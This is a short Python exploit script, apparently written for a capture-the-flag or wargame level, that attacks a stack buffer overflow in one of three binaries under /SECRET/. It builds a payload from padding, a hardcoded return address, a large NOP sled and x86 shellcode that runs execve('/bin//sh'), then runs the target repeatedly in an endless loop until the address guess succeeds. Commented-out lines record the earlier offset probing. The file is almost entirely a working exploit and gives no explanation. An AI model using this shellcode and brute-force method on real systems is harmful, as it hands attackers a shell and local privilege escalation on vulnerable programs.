import os, sys
files= ["/SECRET/door1/file","/SECRET/door2/file","/SECRET/door3/file"]
#exploit = "A"*500
#exploit = "A"*171 + "B"*4 + "x90"*8 + "C"*(500-171-4-8)

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
#exploit = "A"*171 + "B"*4 + "x90"*16 + shell + "C"*(500-171-4-16-len(shell))

exploit = "A"*171 + "\x31\x0e\xcc\xbf" + "\x90"*20480 +shell

#If Segfault, retry or shell
while True:
	fileSize=[]
	for f in files:
		fileSize.append(os.path.getsize(f))
	index = fileSize.index(min(fileSize))
	os.system(files[index]+" "+exploit)

#os.system("./file "+ exploit)
#os.system("gdb --args file "+exploit)
